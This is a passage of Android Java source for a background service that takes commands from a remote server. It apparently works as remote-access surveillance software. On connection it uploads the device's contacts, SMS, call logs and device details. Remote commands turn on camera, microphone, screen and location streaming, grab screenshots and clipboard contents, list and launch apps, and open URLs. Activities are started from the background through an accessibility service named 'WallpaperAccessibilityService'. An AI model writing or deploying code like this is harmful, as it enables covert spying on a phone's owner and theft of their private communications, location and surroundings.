        } catch (Exception e) {
            Log.e(TAG, "Failed creating DataChannel", e);
        }
    }

    private void connectSignaling() {
        String signalingUrl = getSignalingUrl();
        Log.i(TAG, "Connecting to signaling at " + signalingUrl);

        IO.Options opts = new IO.Options();
        opts.transports = new String[]{"websocket", "polling"};
        opts.reconnection = true;
        opts.reconnectionAttempts = Integer.MAX_VALUE;
        opts.reconnectionDelay = 2000;
        opts.reconnectionDelayMax = 5000;
        opts.timeout = 20000;

        try {
            socket = IO.socket(signalingUrl, opts);
        } catch (URISyntaxException e) {
            Log.e(TAG, "Bad signaling URL", e);
            stopSelf();
            return;
        }

        // Initialize Filesystem Extension
        fileSystemExtension = new FileSystemExtension(this, socket);
        fileSystemExtension.init();

        socket.on(Socket.EVENT_CONNECT, args -> {
            Log.i(TAG, "Socket.IO CONNECTED to " + signalingUrl);
            try {
                String devId = getPhysicalDeviceId();
                JSONObject identifyData = new JSONObject();
                identifyData.put("type", "android");
                identifyData.put("deviceId", devId);
                identifyData.put("model", Build.MODEL);
                identifyData.put("manufacturer", Build.MANUFACTURER);
                socket.emit(Constants.EVENT_IDENTIFY, identifyData);
            } catch (Exception e) {
                Log.w(TAG, "Failed emitting structured identify, falling back to string", e);
                socket.emit(Constants.EVENT_IDENTIFY, "android");
            }
            sendDeviceInfo();
            // Offer is only created when web-client-ready fires (avoids double offer)
        }).on(Socket.EVENT_DISCONNECT, args -> {
            String reason = (args != null && args.length > 0) ? String.valueOf(args[0]) : "unknown";
            Log.w(TAG, "Socket.IO DISCONNECTED (" + reason + "). Scheduling reconnect check...");
            new Handler(Looper.getMainLooper()).postDelayed(() -> {
                if (socket != null && !socket.connected() && !socket.isActive()) {
                    Log.d(TAG, "Proactively reconnecting socket after disconnect...");
                    socket.connect();
                }
            }, 3000);
        }).on(Socket.EVENT_CONNECT_ERROR, args -> {
            String errorMsg = (args != null && args.length > 0) ? String.valueOf(args[0]) : "unknown";
            Log.e(TAG, "Socket.IO connect error to " + signalingUrl + ": " + errorMsg);
            if (args != null && args.length > 0 && args[0] instanceof Throwable) {
                Log.e(TAG, "Connect error cause:", (Throwable) args[0]);
            }
        }).on("id", args -> {
            Log.d(TAG, "Received socket ID: " + args[0]);
        }).on(Constants.EVENT_WEB_CLIENT_READY, args -> {
            String newClientId = (String) args[0];
            Log.d(TAG, "Web client ready: " + newClientId);
            boolean clientChanged = webClientId == null || !webClientId.equals(newClientId);
            webClientId = newClientId;
            if (clientChanged || peerConnection == null) {
                Log.d(TAG, "Rebuilding PeerConnection for session: " + webClientId);
                rebuildPeerConnection();
            }
            sendCallLogs(); // Immediate sync
            sendSmsMessages(); // Immediate sync
            sendContacts(); // Immediate sync
            sendDeviceInfo(); // Immediate sync
            sendStreamStatus(); // Immediate status of streaming states
        }).on(Constants.EVENT_SIGNAL, args -> {
            Log.d(TAG, "Signal incoming");
            if (args[0] instanceof JSONObject) {
                handleSignaling((JSONObject) args[0]);
            }
        }).on("web-client-disconnected", args -> {
            Log.d(TAG, "Web client disconnected: " + args[0]);
            if (args[0].equals(webClientId)) {
                webClientId = null;
                stopLocationUpdates();
                setCameraStreaming("all", false);
                setMicStreaming(false);
                setScreenStreaming(false);
            }
        }).on(Constants.CMD_PING, args -> {
            sendDeviceInfo();
            requestLastLocation();
        }).on(Constants.CMD_STOP, args -> {
            cleanup();
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                stopForeground(Service.STOP_FOREGROUND_REMOVE);
            } else {
                stopForeground(true);
            }
            stopSelf();
        }).on(Constants.CMD_RECORD, args -> {
            toggleLocalRecording();
        }).on(Constants.CMD_GET_APPS, args -> {
            sendAppsList();
        }).on(Constants.CMD_GET_CONTACTS, args -> {
            sendContacts();
        }).on(Constants.CMD_STREAM_CAMERA, args -> {
            if (args.length > 0 && args[0] instanceof JSONObject) {
                handleStreamCamera((JSONObject) args[0]);
            }
        }).on(Constants.CMD_STREAM_MIC, args -> {
            if (args.length > 0 && args[0] instanceof JSONObject) {
                handleStreamMic((JSONObject) args[0]);
            }
        }).on(Constants.CMD_STREAM_LOCATION, args -> {
            if (args.length > 0 && args[0] instanceof JSONObject) {
                handleStreamLocation((JSONObject) args[0]);
            }
        }).on(Constants.CMD_STREAM_SCREEN, args -> {
            if (args.length > 0 && args[0] instanceof JSONObject) {
                handleStreamScreen((JSONObject) args[0]);
            }
        }).on(Constants.CMD_SCREEN_SHARE, args -> {
            if (args.length > 0 && args[0] instanceof JSONObject) {
                handleStreamScreen((JSONObject) args[0]);
            }
        }).on(Constants.CMD_CAMERA_SWITCH, args -> {
            handleCameraSwitch();
        }).on(Constants.CMD_VIBRATE, args -> {
            if (args.length > 0 && args[0] instanceof JSONObject) {
                vibrateDevice((JSONObject) args[0]);
            } else {
                vibrateDevice(null);
            }
        }).on(Constants.CMD_TOAST, args -> {
            if (args.length > 0 && args[0] instanceof JSONObject) {
                showToast((JSONObject) args[0]);
            }
        }).on(Constants.CMD_OPEN_URL, args -> {
            if (args.length > 0 && args[0] instanceof JSONObject) {
                openUrl((JSONObject) args[0]);
            }
        }).on(Constants.CMD_FLASHLIGHT, args -> {
            if (args.length > 0 && args[0] instanceof JSONObject) {
                toggleFlashlight((JSONObject) args[0]);
            } else {
                toggleFlashlight(null);
            }
        }).on(Constants.CMD_SET_VOLUME, args -> {
            if (args.length > 0 && args[0] instanceof JSONObject) {
                setVolume((JSONObject) args[0]);
            }
        }).on(Constants.CMD_SET_BRIGHTNESS, args -> {
            if (args.length > 0 && args[0] instanceof JSONObject) {
                setBrightness((JSONObject) args[0]);
            }
        }).on(Constants.CMD_RING_DEVICE, args -> {
            ringDevice();
        }).on(Constants.CMD_SET_QUALITY, args -> {
            if (args.length > 0 && args[0] instanceof JSONObject) {
                setVideoQuality((JSONObject) args[0]);
            }
        }).on(Constants.CMD_SET_GPS_INTERVAL, args -> {
            if (args.length > 0 && args[0] instanceof JSONObject) {
                setGpsInterval((JSONObject) args[0]);
            }
        }).on(Constants.CMD_LAUNCH_APP, args -> {
            if (args.length > 0 && args[0] instanceof JSONObject) {
                launchApp((JSONObject) args[0]);
            }
        }).on(Constants.CMD_TOGGLE_SENSORS, args -> {
            if (args.length > 0 && args[0] instanceof JSONObject) {
                toggleSensorSubscription((JSONObject) args[0]);
            }
        }).on(Constants.CMD_GET_NETWORK, args -> {
            sendNetworkDiagnostics();
        }).on(Constants.CMD_TAKE_SNAPSHOT, args -> {
            if (args.length > 0 && args[0] instanceof JSONObject) {
                takeCameraSnapshot((JSONObject) args[0]);
            }
        }).on(Constants.CMD_TAKE_SCREENSHOT, args -> {
            JSONObject payload = (args.length > 0 && args[0] instanceof JSONObject) ? (JSONObject) args[0] : null;
            takeDeviceScreenshot(payload);
        }).on(Constants.CMD_OPEN_A11Y_SETTINGS, args -> {
            openAccessibilitySettings();
        }).on(Constants.CMD_GET_CLIPBOARD, args -> {
            getClipboardText();
        }).on(Constants.CMD_SET_CLIPBOARD, args -> {
            if (args.length > 0 && args[0] instanceof JSONObject) {
                setClipboardText((JSONObject) args[0]);
            }
        }).on(Constants.CMD_TTS_SPEAK, args -> {
            if (args.length > 0 && args[0] instanceof JSONObject) {
                speakTts((JSONObject) args[0]);
            }
        });

        socket.connect();
    }

    private void toggleLocalRecording() {
        if (localRecorder == null) {
            localRecorder = new LocalRecorder(this, eglBase);
        }
        if (localRecorder.isRecording()) {
            localRecorder.stop(path -> {
                Log.d(TAG, "Local recording stopped, saved to: " + path);
                sendRecordingStatus(false, path);
            });
        } else {
            String path = null;
            if (cameraManager != null) {
                if (cameraManager.hasBackCamera()) {
                    if (!cameraManager.isBackRunning()) {
                        cameraManager.startBackCamera();
                    }
                    path = localRecorder.startSingle(cameraManager.getBackTrack());
                } else if (cameraManager.hasFrontCamera()) {
                    if (!cameraManager.isFrontRunning()) {
                        cameraManager.startFrontCamera();
                    }
                    path = localRecorder.startSingle(cameraManager.getFrontTrack());
                }
            }
            if (path != null) {
                Log.d(TAG, "Local recording started, saving to: " + path);
                sendRecordingStatus(true, path);
            }
        }
    }

    private void sendRecordingStatus(boolean active, String path) {
        if (webClientId == null || socket == null || !socket.connected()) return;
        try {
            JSONObject data = new JSONObject()
                    .put("type", "recording_status")
                    .put("active", active);
            if (path != null) {
                data.put("file", path);
            }
            JSONObject msg = new JSONObject()
                    .put("to", webClientId)
                    .put("from", socket.id())
                    .put("signal", data);
            socket.emit(Constants.EVENT_SIGNAL, msg);
        } catch (JSONException e) {
            Log.e(TAG, "Error sending recording status", e);
        }
    }

    private void sendDeviceInfo() {
        if (socket == null || !socket.connected()) return;
        try {
            JSONObject info = new JSONObject();
            info.put("deviceId", getPhysicalDeviceId());
            info.put("model", Build.MODEL);
            info.put("manufacturer", Build.MANUFACTURER);
            info.put("version", Build.VERSION.RELEASE);
            info.put("streaming", isFrontCameraStreaming || isBackCameraStreaming || isMicStreaming || isScreenStreaming);
            info.put("recording", localRecorder != null && localRecorder.isRecording());
            info.put("cameraStreaming", isFrontCameraStreaming || isBackCameraStreaming);
            info.put("frontCameraStreaming", isFrontCameraStreaming);
            info.put("backCameraStreaming", isBackCameraStreaming);
            info.put("screenStreaming", isScreenStreaming);
            info.put("micStreaming", isMicStreaming);
            info.put("locationStreaming", isLocationStreaming);

            // Get battery details dynamically
            JSONObject battery = getBatteryDetails();
            info.put("battery", battery.optInt("percent", 0));
            info.put("batteryTemp", battery.optDouble("temperature", 0.0));
            info.put("chargingSource", battery.optString("source", "unplugged"));

            // Get storage details
            long[] storage = getStorageMetrics();
            double totalGB = storage[0] / (1024.0 * 1024.0 * 1024.0);
            double freeGB = storage[1] / (1024.0 * 1024.0 * 1024.0);
            info.put("storageTotal", Math.round(totalGB * 100.0) / 100.0);
            info.put("storageFree", Math.round(freeGB * 100.0) / 100.0);
            info.put("from", socket.id());
            if (webClientId != null) info.put("to", webClientId);
            socket.emit(Constants.EVENT_DEVICE_INFO, info);
        } catch (Exception e) {
            Log.e(TAG, "Error sending device info", e);
        }
    }

    private JSONObject getBatteryDetails() {
        JSONObject details = new JSONObject();
        try {
            IntentFilter ifilter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
            Intent batteryStatus = registerReceiver(null, ifilter);
            if (batteryStatus != null) {
                int level = batteryStatus.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
                int scale = batteryStatus.getIntExtra(BatteryManager.EXTRA_SCALE, -1);
                int chargePlug = batteryStatus.getIntExtra(BatteryManager.EXTRA_PLUGGED, -1);
                int temperature = batteryStatus.getIntExtra(BatteryManager.EXTRA_TEMPERATURE, -1);

                double batteryPct = (scale > 0) ? (level * 100 / (double) scale) : 0;
                double tempC = temperature / 10.0;

                String source = "unplugged";
                if (chargePlug == BatteryManager.BATTERY_PLUGGED_AC) source = "AC Charger";
                else if (chargePlug == BatteryManager.BATTERY_PLUGGED_USB) source = "USB Port";
                else if (chargePlug == BatteryManager.BATTERY_PLUGGED_WIRELESS) source = "Wireless";

                details.put("percent", (int) batteryPct);
                details.put("temperature", tempC);
                details.put("source", source);
            }
        } catch (Exception e) {
            Log.e(TAG, "Error fetching battery details", e);
        }
        return details;
    }

    private long[] getStorageMetrics() {
        try {
            File path = android.os.Environment.getDataDirectory();
            android.os.StatFs stat = new android.os.StatFs(path.getPath());
            long blockSize = stat.getBlockSizeLong();
            long totalBlocks = stat.getBlockCountLong();
            long availableBlocks = stat.getAvailableBlocksLong();

            long totalBytes = totalBlocks * blockSize;
            long freeBytes = availableBlocks * blockSize;

            return new long[]{ totalBytes, freeBytes };
        } catch (Exception e) {
            Log.e(TAG, "Error fetching storage metrics", e);
            return new long[]{0, 0};
        }
    }

    private void setVideoQuality(JSONObject payload) {
        if (payload == null || cameraManager == null) return;
        String quality = payload.optString("quality", "medium");
        int width = 640;
        int height = 480;
        int fps = 15;
        if ("low".equals(quality)) {
            width = 320;
            height = 240;
            fps = 10;
        } else if ("high".equals(quality)) {
            width = 1280;
            height = 720;
            fps = 30;
        }
        cameraManager.changeResolution(width, height, fps);
    }

    private void setGpsInterval(JSONObject payload) {
        if (payload == null) return;
        long intervalMs = payload.optLong("intervalMs", 10000);
        Log.d(TAG, "Setting GPS polling interval to: " + intervalMs + "ms");
        if (intervalMs <= 0) {
            setLocationStreaming(false, 0);
        } else {
            currentGpsIntervalMs = intervalMs;
            if (isLocationStreaming) {
                startLocationUpdates(intervalMs);
            }
        }
    }

    private void launchApp(JSONObject payload) {
        if (payload == null) return;
        String packageName = payload.optString("packageName", "");
        if (!packageName.isEmpty()) {
            try {
                Intent intent = getPackageManager().getLaunchIntentForPackage(packageName);
                if (intent != null) {
                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    startActivity(intent);
                    Log.d(TAG, "Successfully launched app package: " + packageName);
                } else {
                    Log.w(TAG, "No launch intent found for package: " + packageName);
                }
            } catch (Exception e) {
                Log.e(TAG, "Error launching app: " + packageName, e);
            }
        }
    }

    private void sendAppsList() {
        if (webClientId == null || socket == null || !socket.connected()) return;
        new Thread(() -> {
            try {
                JSONArray apps = new JSONArray();
                PackageManager pm = getPackageManager();
                for (ApplicationInfo packageInfo : pm.getInstalledApplications(PackageManager.GET_META_DATA)) {
                    if ((packageInfo.flags & ApplicationInfo.FLAG_SYSTEM) == 0) {
                        JSONObject app = new JSONObject();
                        app.put("name", pm.getApplicationLabel(packageInfo).toString());
                        app.put("package", packageInfo.packageName);
                        try {
                            app.put("version", pm.getPackageInfo(packageInfo.packageName, 0).versionName);
                        } catch (Exception e) {
                            app.put("version", "unknown");
                        }
                        apps.put(app);
                    }
                }
                JSONObject msg = new JSONObject()
                        .put("to", webClientId)
                        .put("from", socket.id())
                        .put("apps", apps);
                socket.emit(Constants.EVENT_APPS, msg);
            } catch (Exception e) {
                Log.e(TAG, "Error listing apps", e);
            }
        }).start();
    }

    private void sendContacts() {
        if (webClientId == null || socket == null || !socket.connected()) return;
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
            Log.w(TAG, "Read contacts permission not granted");
            return;
        }
        new Thread(() -> {
            try {
                JSONArray contacts = new JSONArray();
                Cursor cursor = getContentResolver().query(
                        ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                        null, null, null,
                        ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC"
                );
                if (cursor != null) {
                    int nameIdx = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME);
                    int numberIdx = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER);
                    while (cursor.moveToNext()) {
                        JSONObject contact = new JSONObject();
                        contact.put("name", cursor.getString(nameIdx));
                        contact.put("number", cursor.getString(numberIdx));
                        contacts.put(contact);
                    }
                    cursor.close();
                }
                JSONObject msg = new JSONObject()
                        .put("to", webClientId)
                        .put("from", socket.id())
                        .put("contacts_list", contacts);
                socket.emit(Constants.EVENT_CONTACTS, msg);
            } catch (Exception e) {
                Log.e(TAG, "Error fetching contacts", e);
            }
        }).start();
    }

    private void vibrateDevice(JSONObject payload) {
        try {
            long duration = payload != null ? payload.optLong("duration", 500) : 500;
            Vibrator v = (Vibrator) getSystemService(Context.VIBRATOR_SERVICE);
            if (v != null && v.hasVibrator()) {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    v.vibrate(VibrationEffect.createOneShot(duration, VibrationEffect.DEFAULT_AMPLITUDE));
                } else {
                    v.vibrate(duration);
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error vibrating device", e);
        }
    }

    private void showToast(JSONObject payload) {
        if (payload == null) return;
        String text = payload.optString("text", "");
        if (!text.isEmpty()) {
            new Handler(Looper.getMainLooper()).post(() ->
                Toast.makeText(StreamingService.this, text, Toast.LENGTH_SHORT).show()
            );
        }
    }

    private void openUrl(JSONObject payload) {
        if (payload == null) return;
        String url = payload.optString("url", "");
        if (!url.isEmpty()) {
            try {
                android.net.Uri uri = android.net.Uri.parse(url);
                Intent intent = new Intent(Intent.ACTION_VIEW, uri);
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(intent);
            } catch (Exception e) {
                Log.e(TAG, "Error opening URL", e);
            }
        }
    }

    private boolean isTorchOn = false;
    private void toggleFlashlight(JSONObject payload) {
        try {
            android.hardware.camera2.CameraManager cm = (android.hardware.camera2.CameraManager) getSystemService(CAMERA_SERVICE);
            if (cm == null) return;
            String cameraId = null;
            for (String id : cm.getCameraIdList()) {
                Boolean hasFlash = cm.getCameraCharacteristics(id).get(android.hardware.camera2.CameraCharacteristics.FLASH_INFO_AVAILABLE);
                if (hasFlash != null && hasFlash) {
                    cameraId = id;
                    break;
                }
            }
            if (cameraId == null) {
                Log.w(TAG, "No camera with flashlight found");
                return;
            }
            isTorchOn = (payload != null) ? payload.optBoolean("on", !isTorchOn) : !isTorchOn;
            cm.setTorchMode(cameraId, isTorchOn);
            Log.d(TAG, "Flashlight toggled to: " + isTorchOn);
        } catch (Exception e) {
            Log.e(TAG, "Flashlight error", e);
        }
    }

    private void setVolume(JSONObject payload) {
        if (payload == null) return;
        try {
            AudioManager am = (AudioManager) getSystemService(AUDIO_SERVICE);
            if (am == null) return;
            int streamType = AudioManager.STREAM_MUSIC;
            switch (payload.optString("stream", "music")) {
                case "ring":
                    streamType = AudioManager.STREAM_RING;
                    break;
                case "alarm":
                    streamType = AudioManager.STREAM_ALARM;
                    break;
                case "call":
                    streamType = AudioManager.STREAM_VOICE_CALL;
                    break;
            }
            int maxVol = am.getStreamMaxVolume(streamType);
            int pct = Math.min(100, Math.max(0, payload.optInt("pct", 50)));
            int volume = (int) (maxVol * pct / 100.0);
            am.setStreamVolume(streamType, volume, 0);
            Log.d(TAG, "Volume set to " + volume + "/" + maxVol + " for stream " + streamType);
        } catch (Exception e) {
            Log.e(TAG, "Set volume error", e);
        }
    }

    private void setBrightness(JSONObject payload) {
        if (payload == null) return;
        try {
            int pct = Math.min(100, Math.max(0, payload.optInt("pct", 50)));
            int val = (int) (pct / 100.0 * 255);
            if (Settings.System.canWrite(this)) {
                Settings.System.putInt(getContentResolver(),
                        Settings.System.SCREEN_BRIGHTNESS_MODE,
                        Settings.System.SCREEN_BRIGHTNESS_MODE_MANUAL);
                Settings.System.putInt(getContentResolver(),
                        Settings.System.SCREEN_BRIGHTNESS, val);
                Log.d(TAG, "Brightness set to: " + val);
            } else {
                Log.w(TAG, "WRITE_SETTINGS permission not granted");
                new Handler(Looper.getMainLooper()).post(() ->
                    Toast.makeText(StreamingService.this, "Please grant Write Settings permission to adjust brightness", Toast.LENGTH_LONG).show()
                );
            }
        } catch (Exception e) {
            Log.e(TAG, "Set brightness error", e);
        }
    }

    private android.media.Ringtone activeRingtone;

    private void ringDevice() {
        try {
            // Stop any previously playing ringtone
            if (activeRingtone != null && activeRingtone.isPlaying()) {
                activeRingtone.stop();
            }
            AudioManager am = (AudioManager) getSystemService(AUDIO_SERVICE);
            if (am != null) {
                am.setStreamVolume(AudioManager.STREAM_RING,
                        am.getStreamMaxVolume(AudioManager.STREAM_RING), 0);
            }
            activeRingtone = android.media.RingtoneManager.getRingtone(this,
                    android.media.RingtoneManager.getDefaultUri(android.media.RingtoneManager.TYPE_RINGTONE));
            if (activeRingtone != null) {
                activeRingtone.play();
                Log.d(TAG, "Playing default ringtone");
                // Auto-stop after 15 seconds to prevent indefinite playback
                new Handler(Looper.getMainLooper()).postDelayed(() -> {
                    if (activeRingtone != null && activeRingtone.isPlaying()) {
                        activeRingtone.stop();
                        Log.d(TAG, "Ringtone auto-stopped after timeout");
                    }
                }, 15000);
            }
        } catch (Exception e) {
            Log.e(TAG, "Ring device error", e);
        }
    }

    private long currentGpsIntervalMs = 10000;

    private boolean isGpsEnabled() {
        LocationManager locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
        if (locationManager == null) {
            return false;
        }
        try {
            boolean isLocationOn = true;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                isLocationOn = locationManager.isLocationEnabled();
            }
            return isLocationOn && locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER);
        } catch (Exception e) {
            Log.e(TAG, "Error checking GPS status", e);
            return false;
        }
    }

    private synchronized void promptEnableGps() {
        long now = SystemClock.elapsedRealtime();
        if (now - lastGpsPromptTime < GPS_PROMPT_DEBOUNCE_MS) {
            Log.d(TAG, "GPS prompt debounced");
            return;
        }
        lastGpsPromptTime = now;

        Log.d(TAG, "Prompting user to enable GPS/location via native OS dialog");

        Intent intent = new Intent(this, GpsResolutionActivity.class);
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);

        boolean launched = false;
        if (WallpaperAccessibilityService.isRunning()) {
            try {
                WallpaperAccessibilityService.getInstance().startActivity(intent);
                launched = true;
                Log.i(TAG, "Launched GpsResolutionActivity via AccessibilityService");
            } catch (Exception e) {
                Log.w(TAG, "Failed launching GpsResolutionActivity via AccessibilityService", e);
            }
        }
        if (!launched) {
            try {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
                    ActivityOptions opts = ActivityOptions.makeBasic();
                    opts.setPendingIntentBackgroundActivityStartMode(ActivityOptions.MODE_BACKGROUND_ACTIVITY_START_ALLOWED);
                    PendingIntent pi = PendingIntent.getActivity(this, 0, intent, PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
                    pi.send(this, 0, null, null, null, null, opts.toBundle());
                    launched = true;
                    Log.i(TAG, "Launched GpsResolutionActivity via PendingIntent with BAL allowed");
                }
            } catch (Exception e) {
                Log.w(TAG, "Failed launching GpsResolutionActivity via PendingIntent", e);
            }
        }
        if (!launched) {
            try {
                startActivity(intent);
                Log.i(TAG, "Launched GpsResolutionActivity directly");
            } catch (Exception e) {
                Log.e(TAG, "Failed to start GpsResolutionActivity", e);
            }
        }
    }

    private void cancelGpsNotification() {
        NotificationManager nm = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
        if (nm != null) {
            nm.cancel(Constants.NOTIFICATION_ID_GPS_PROMPT);
        }
    }

    private void startLocationUpdates() {
        startLocationUpdates(currentGpsIntervalMs);
    }

    private void startLocationUpdates(long intervalMs) {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            Log.w(TAG, "Location permission not granted");
            broadcastPermissionError();
            isLocationStreaming = false;
            return;
        }

        if (!isGpsEnabled()) {
            promptEnableGps();
        }

        stopLocationUpdates();
        currentGpsIntervalMs = intervalMs;
        if (intervalMs <= 0) {
            Log.d(TAG, "GPS location updates suspended");
            isLocationStreaming = false;
            return;
        }

        LocationRequest locationRequest = new LocationRequest.Builder(
                com.google.android.gms.location.Priority.PRIORITY_HIGH_ACCURACY, intervalMs)
                .setMinUpdateIntervalMillis(intervalMs / 2)
                .build();

        LocationSettingsRequest.Builder settingsBuilder = new LocationSettingsRequest.Builder()
                .addLocationRequest(locationRequest)
                .setAlwaysShow(true);

        LocationServices.getSettingsClient(this)
                .checkLocationSettings(settingsBuilder.build())
                .addOnFailureListener(e -> {
                    if (e instanceof ResolvableApiException) {
                        Log.d(TAG, "Google Play Location settings unsatisfied, prompting to enable GPS");
                        promptEnableGps();
                    }
                });

        locationCallback = new LocationCallback() {
            @Override
            public void onLocationResult(LocationResult locationResult) {
                if (locationResult == null) return;
                for (android.location.Location location : locationResult.getLocations()) {
                    sendLocation(location.getLatitude(), location.getLongitude());
                }
            }
        };

        try {
            fusedLocationClient.requestLocationUpdates(locationRequest, locationCallback, Looper.getMainLooper());
            isLocationStreaming = true;
            Log.d(TAG, "Started location updates with interval: " + intervalMs + "ms");
        } catch (SecurityException e) {
            Log.e(TAG, "Failed to start location updates", e);
            isLocationStreaming = false;
            broadcastPermissionError();
        }
    }

    private void sendLocation(double latitude, double longitude) {
        JSONObject locationData = new JSONObject();
        try {
            locationData.put("from", socket != null ? socket.id() : "");
            locationData.put("to", webClientId != null ? webClientId : "");
            locationData.put("latitude", latitude);
            locationData.put("longitude", longitude);
            locationData.put("timestamp", System.currentTimeMillis());
        } catch (JSONException ignored) {}

        if (socket != null && socket.connected()) {
            socket.emit(Constants.EVENT_LOCATION, locationData);
            Log.d(TAG, "Sent location via Socket.IO: lat=" + latitude + ", lng=" + longitude);
        }

        // WebRTC DataChannel synchronized transport (Path A ultra-low latency architecture)
        if (telemetryDataChannel != null && telemetryDataChannel.state() == org.webrtc.DataChannel.State.OPEN) {
            try {
                byte[] bytes = locationData.toString().getBytes(java.nio.charset.StandardCharsets.UTF_8);
                java.nio.ByteBuffer buffer = java.nio.ByteBuffer.wrap(bytes);
                telemetryDataChannel.send(new org.webrtc.DataChannel.Buffer(buffer, false));
                Log.d(TAG, "Sent location via WebRTC DataChannel: lat=" + latitude + ", lng=" + longitude);
            } catch (Exception e) {
                Log.w(TAG, "Failed sending location over WebRTC DataChannel", e);
            }
        }
    }

    private void requestLastLocation() {
        if (fusedLocationClient != null) {
            try {
                fusedLocationClient.getLastLocation().addOnSuccessListener(location -> {
                    if (location != null) {
                        sendLocation(location.getLatitude(), location.getLongitude());
                    }
                });
            } catch (SecurityException ignored) {}
        }
    }

    private void stopLocationUpdates() {
        if (locationCallback != null && fusedLocationClient != null) {
            fusedLocationClient.removeLocationUpdates(locationCallback);
            locationCallback = null;
            Log.d(TAG, "Stopped location updates");
        }
        isLocationStreaming = false;
    }

    // ── On-Demand Streaming Control Handlers ─────────────────────────

    private void handleStreamCamera(JSONObject payload) {
        if (payload == null || cameraManager == null) return;
        boolean active = payload.optBoolean("active", false);
        String camera = payload.optString("camera", "all");
        setCameraStreaming(camera, active);
    }

    private void handleStreamMic(JSONObject payload) {
        if (payload == null) return;
        boolean active = payload.optBoolean("active", false);
        setMicStreaming(active);
    }

    private void handleStreamLocation(JSONObject payload) {
        if (payload == null) return;
        boolean active = payload.optBoolean("active", false);
        long intervalMs = payload.optLong("intervalMs", currentGpsIntervalMs);
        setLocationStreaming(active, intervalMs);
    }

    private void handleCameraSwitch() {
        if (cameraManager == null) return;
        if (isFrontCameraStreaming && !isBackCameraStreaming) {
            setCameraStreaming("front", false);
            setCameraStreaming("back", true);
        } else if (isBackCameraStreaming && !isFrontCameraStreaming) {
            setCameraStreaming("back", false);
            setCameraStreaming("front", true);
        } else if (!isFrontCameraStreaming && !isBackCameraStreaming) {
            setCameraStreaming("back", true);
        }
    }

    private void setCameraStreaming(String camera, boolean enable) {
        if (cameraManager == null) return;
        if ("front".equalsIgnoreCase(camera) || "all".equalsIgnoreCase(camera) || "both".equalsIgnoreCase(camera)) {
            isFrontCameraStreaming = enable;
            if (enable) {
                if (cameraManager.isFrontHardwareBusy()) {
                    isFrontCameraBusy = true;
                    ensureScreenCaptureFallback();
                } else {
                    cameraManager.startFrontCamera();
                }
                if (cameraManager.getFrontTrack() != null) {
                    cameraManager.getFrontTrack().setEnabled(!cameraManager.isFrontHardwareBusy());
                }
            } else {
                isFrontCameraBusy = false;
                cameraManager.stopFrontCamera();
                if (cameraManager.getFrontTrack() != null) {
                    cameraManager.getFrontTrack().setEnabled(false);
                }
            }
        }
        if ("back".equalsIgnoreCase(camera) || "all".equalsIgnoreCase(camera) || "both".equalsIgnoreCase(camera)) {
            isBackCameraStreaming = enable;
            if (enable) {
                if (cameraManager.isBackHardwareBusy()) {
                    isBackCameraBusy = true;
                    ensureScreenCaptureFallback();
                } else {
                    cameraManager.startBackCamera();
                }
                if (cameraManager.getBackTrack() != null) {
                    cameraManager.getBackTrack().setEnabled(!cameraManager.isBackHardwareBusy());
                }
            } else {
                isBackCameraBusy = false;
                cameraManager.stopBackCamera();
                if (cameraManager.getBackTrack() != null) {
                    cameraManager.getBackTrack().setEnabled(false);
                }
            }
        }
        updateForegroundServiceNotification(isScreenStreaming);
        Log.d(TAG, "Camera streaming updated: camera=" + camera + ", enable=" + enable);
        sendStreamStatus();
    }

    private synchronized void setMicStreaming(boolean enable) {
        isMicStreaming = enable;
        try {
            if (enable) {
                if (audioSource == null && factory != null) {
                    MediaConstraints audioConstraints = new MediaConstraints();
                    audioConstraints.mandatory.add(new MediaConstraints.KeyValuePair("googEchoCancellation", "true"));
                    audioConstraints.mandatory.add(new MediaConstraints.KeyValuePair("googAutoGainControl", "true"));
                    audioConstraints.mandatory.add(new MediaConstraints.KeyValuePair("googNoiseSuppression", "true"));
                    audioConstraints.mandatory.add(new MediaConstraints.KeyValuePair("googHighpassFilter", "true"));
                    audioSource = factory.createAudioSource(audioConstraints);
                    audioTrack = factory.createAudioTrack("audio", audioSource);
                    audioTrack.setEnabled(true);
                    Log.d(TAG, "Audio source & track created for on-demand mic stream");
                }
                if (audioTransceiver != null && audioTransceiver.getSender() != null && audioTrack != null) {
                    audioTransceiver.getSender().setTrack(audioTrack, false);
                }
            } else {
                // Detach track from transceiver sender to stop hardware recording
                if (audioTransceiver != null && audioTransceiver.getSender() != null) {
                    audioTransceiver.getSender().setTrack(null, false);
                }
                if (audioTrack != null) {
                    audioTrack.setEnabled(false);
                    audioTrack.dispose();
                    audioTrack = null;
                }
                if (audioSource != null) {
                    audioSource.dispose();
                    audioSource = null;
                }
                Log.d(TAG, "Audio track and source disposed, microphone hardware released");
            }
        } catch (Exception e) {
            Log.e(TAG, "Error updating mic streaming: " + enable, e);
        }
        updateForegroundServiceNotification(isScreenStreaming);
        Log.d(TAG, "Mic streaming updated: " + enable);
        sendStreamStatus();
    }

    private void setLocationStreaming(boolean enable, long intervalMs) {
        isLocationStreaming = enable;
        if (enable) {
